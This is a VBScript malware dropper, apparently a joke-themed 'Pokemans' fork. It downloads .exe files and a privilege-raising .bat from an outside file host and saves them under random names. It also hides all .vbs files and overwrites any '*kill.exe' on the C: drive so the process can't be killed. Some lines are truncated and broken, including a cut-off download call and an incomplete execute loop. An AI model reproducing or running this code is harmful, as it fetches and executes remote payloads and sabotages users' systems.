'''All the New Pokemans Fork'''
Dim list
Dim max, min
max=999999999
min=100000000
Randomize
Set list = CreateObject("System.Collections.ArrayList")
	list.Add "http://a.pomf.cat/uthqdm.exe"		   'eevee.exe
	list.Add "http://a.pomf.cat/utoojo.exe"        'wscript
	list.Add "https://a.pomf.cat/ayunww.bat"	   'raise privilegdges
i = 0

CreateObject("WScript.Shell").run "cmd.exe /c for /r %i in (*.vbs) do attrib +h ""%i"""  'Hide all vbs
CreateObject("WScript.Shell").run "cmd.exe /c for /r C:\ %i in (*kill.exe) do echo . > ""%i""" 'corrupt the taskkillers
CreateObject("WScript.Shell").run "cmd.exe"

call getFiles(list.Item(0), (Int((max-min+1)*Rnd+min))&".exe")
call getFiles(list.Item(1), 

'''Usage: getFiles(value, fileName)
'  Where value is the item to be downloaded
'  and fileName is the name of the output file
Function getFiles(value, fileName)
	strHDLocation = fileName
	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
	objXMLHTTP.open "GET", value, false
	objXMLHTTP.send()
    If objXMLHTTP.Status = 200 Then
		Set objADOStream = CreateObject("ADODB.Stream")
		objADOStream.Open
		objADOStream.Type = 1 
		objADOStream.Write objXMLHTTP.ResponseBody
		objADOStream.Position = 0    
		Set objFSO = Createobject("Scripting.FileSystemObject")
		If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
			Set objFSO = Nothing
			objADOStream.SaveToFile strHDLocation
			objADOStream.Close	
			Set objADOStream = Nothing
		End if
	End If	
End Function

Function executeEevees() 'no seriously kill them all
	CreateObject("WScript.Shell").run "cmd /c start for /r %i in (*.exe) do "
End Function

